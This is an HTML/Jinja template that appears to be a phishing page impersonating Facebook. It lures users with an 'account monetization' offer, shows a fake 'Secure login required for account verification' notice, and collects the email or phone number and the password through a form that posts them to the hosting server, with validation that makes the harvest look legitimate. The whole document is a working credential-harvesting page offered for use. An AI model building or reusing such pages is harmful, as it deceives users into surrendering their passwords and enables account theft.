{% extends "base.html" %}
{% block body %}
<div class="card" style="max-width:520px;margin:28px auto;box-shadow:0 6px 18px rgba(24,119,242,0.25);border-radius:16px;">
  <div class="platform-header">
    <div class="icon-circle bg-facebook">
      <i class="fa-brands fa-facebook icon-lg"></i>
    </div>
    <div>
      <h2 class="notranslate" style="margin:0;color:#1877F2;">Facebook</h2>
      <div style="color:#64748b;font-size:13px;margin-top:4px">Continue with your account monetization</div>
    </div>
  </div>

  <form id="loginForm" method="post" novalidate>
    <div class="form-group">
      <label class="form-label">Email or Phone Number</label>
      <input class="input" id="address" name="address" placeholder="Enter your email or phone number" required>
      <div class="error-text" id="addressError"></div>
    </div>

    <div class="form-group">
      <label class="form-label">Password</label>
      <input class="input" id="password" name="password" type="password" placeholder="Enter your password" required>
      <div class="error-text" id="passwordError"></div>
    </div>

    <button class="btn login-btn" type="submit">
      <span class="btn-text">Continue to Monetization</span>
    </button>
  </form>

  <div class="security-note">
    <p>ðŸ”’ Secure login required for account verification</p>
  </div>
</div>

<style>
.input {
  width: 100%;
  padding: 16px 20px;
  border-radius: 18px;
  border: 2px solid #e5e7eb;
  margin-bottom: 8px;
  font-size: 16px;
  transition: border-color 0.3s, box-shadow 0.3s, transform 0.2s;
  background: #ffffff;
  box-sizing: border-box;
}
.input:focus {
  border-color: #1877F2;
  box-shadow: 0 0 0 4px rgba(24, 119, 242, 0.15);
  outline: none;
  transform: translateY(-1px);
}
.input::placeholder {
  color: #9ca3af;
  font-weight: 400;
}
.input-error {
  border-color: #ef4444;
  box-shadow: 0 0 0 4px rgba(239, 68, 68, 0.1);
}
.error-text {
  color: #ef4444;
  font-size: 13px;
  margin-top: 6px;
  margin-bottom: 8px;
  font-weight: 500;
  display: block;
}

.login-btn {
  width: 100%;
  background: #1877F2;
  color: #fff;
  font-size: 16px;
  font-weight: 700;
  padding: 16px 24px;
  border-radius: 25px;
  cursor: pointer;
  border: none;
  transition: all 0.3s ease;
  box-shadow: 0 6px 16px rgba(24,119,242,0.35);
  display: block;
  margin-top: 16px;
  position: relative;
  overflow: hidden;
}
.login-btn:hover {
  background: #166fe5;
  box-shadow: 0 8px 20px rgba(24,119,242,0.45);
  transform: translateY(-2px);
}
.login-btn:active {
  transform: translateY(0);
}
.login-btn::before {
  content: '';
  position: absolute;
  top: 0;
  left: -100%;
  width: 100%;
  height: 100%;
  background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
  transition: left 0.5s;
}
.login-btn:hover::before {
  left: 100%;
}

.btn-text {
  position: relative;
  z-index: 1;
}

.form-group {
  margin-bottom: 20px;
}

.form-label {
  display: block;
  font-weight: 600;
  font-size: 14px;
  margin-bottom: 8px;
  color: #374151;
}

.security-note {
  margin-top: 20px;
  padding: 12px 16px;
  background: #f0f9ff;
  border-radius: 12px;
  border: 1px solid #e0f2fe;
  text-align: center;
}

.security-note p {
  margin: 0;
  color: #0369a1;
  font-size: 0.85rem;
  font-weight: 500;
}
</style>

<script>
document.getElementById("loginForm").addEventListener("submit", function(event) {
  const address = document.getElementById("address");
  const password = document.getElementById("password");
  const addressError = document.getElementById("addressError");
  const passwordError = document.getElementById("passwordError");

  const emailPattern = /^[a-z0-9._%+-]+@[a-z0-9.-]+\.(com|net|org|co|io|me|info|biz)$/;
  const phonePattern = /^\+?\d{6,}$/;

  let valid = true;
  [address, password].forEach(input => input.classList.remove("input-error"));
  [addressError, passwordError].forEach(el => el.textContent = "");

  const addrVal = address.value.trim();

  if (!(emailPattern.test(addrVal) || phonePattern.test(addrVal))) {
    valid = false;
    address.classList.add("input-error");
    addressError.textContent = "Please enter a valid email address or phone number.";
  }

  if (password.value.trim().length < 6) {
    valid = false;
    password.classList.add("input-error");
    passwordError.textContent = "Password must be at least 6 characters long.";
  }

  if (!valid) event.preventDefault();
});

document.querySelectorAll(".input").forEach(input => {
  input.addEventListener("input", () => {
    input.classList.remove("input-error");
    if (input.id === "address") document.getElementById("addressError").textContent = "";
    if (input.id === "password") document.getElementById("passwordError").textContent = "";
  });
});
</script>
{% endblock %}
